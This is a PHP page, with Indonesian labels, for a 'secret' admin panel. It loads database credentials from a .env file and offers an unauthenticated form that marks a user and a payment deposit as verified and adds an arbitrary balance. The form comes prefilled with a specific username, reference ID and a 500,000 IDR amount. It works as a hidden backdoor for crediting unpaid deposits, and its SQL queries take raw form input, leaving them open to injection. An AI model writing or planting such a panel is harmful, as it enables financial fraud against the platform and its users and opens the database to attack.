<?php
/**
 * PANEL ADMIN RAHASIA - AUTO VERIFY
 * Membaca konfigurasi otomatis dari folder Open-AutoGLM
 */

// 1. DETEKSI DATABASE OTOMATIS
$host = 'localhost'; $user = ''; $pass = ''; $name = '';
if (file_exists('.env')) {
    $env = parse_ini_file('.env');
    $host = $env['DB_HOST'] ?? 'localhost';
    $user = $env['DB_USERNAME'] ?? '';
    $pass = $env['DB_PASSWORD'] ?? '';
    $name = $env['DB_DATABASE'] ?? '';
}

$conn = new mysqli($host, $user, $pass, $name);

// 2. LOGIKA PROSES (Jika tombol ditekan)
$message = "";
if (isset($_POST['proses_verify'])) {
    $target_user = $_POST['username'];
    $target_ref  = $_POST['ref_id'];
    $target_amt  = $_POST['amount'];

    $conn->begin_transaction();
    try {
        // Update Profil
        $conn->query("UPDATE users SET referral_status = 'verified', is_active = 1 WHERE username = '$target_user'");
        // Update Deposit
        $conn->query("UPDATE deposits SET status = 'verified' WHERE ref_id = '$target_ref'");
        // Tambah Saldo
        $conn->query("UPDATE users SET balance = balance + $target_amt WHERE username = '$target_user'");
        
        $conn->commit();
        $message = "<div style='color:green;'>✅ Berhasil Memverifikasi $target_user!</div>";
    } catch (Exception $e) {
        $conn->rollback();
        $message = "<div style='color:red;'>❌ Gagal: " . $e->getMessage() . "</div>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Panel Rahasia Auto-Verify</title>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; display: flex; justify-content: center; padding-top: 50px; }
        .panel { background: #2d2d2d; padding: 20px; border-radius: 8px; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        button:hover { background: #218838; }
    </style>
</head>
<body>
    <div class="panel">
        <h3>Panel Verifikasi Cepat</h3>
        <?php echo $message; ?>
        <form method="POST">
            <label>Username:</label>
            <input type="text" name="username" value="akiaki345" required>
            
            <label>REF-ID (Paynexia):</label>
            <input type="text" name="ref_id" value="aa70c9baae32401d8564fae3a9c35191" required>
            
            <label>Nominal Saldo (IDR):</label>
            <input type="number" name="amount" value="500000" required>
            
            <button type="submit" name="proses_verify">EKSEKUSI VERIFIKASI</button>
        </form>
        <p style="font-size: 10px; color: #888; margin-top: 15px;">*Gunakan panel ini hanya untuk keperluan testing owner.</p>
    </div>
</body>
</html>
